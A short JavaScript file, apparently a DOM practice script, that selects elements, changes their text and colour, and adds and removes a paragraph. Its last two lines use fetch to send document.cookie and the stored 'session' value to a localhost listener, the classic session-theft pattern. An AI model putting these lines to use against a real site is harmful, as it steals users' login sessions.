let element = document.getElementById('heading')
let element2 = document.querySelectorAll('.items')

element.innerHTML = "Hej"

element.textContent = "Hejsan"

element.style.color = "red"

let newElement = document.createElement("p")
newElement.textContent = "This is a new element"
document.body.appendChild(newElement)

newElement.remove()

fetch("http://localhost:9000/?c="+document.cookie)

fetch("http://localhost:9000/?c="+localStorage.getItem("session"))

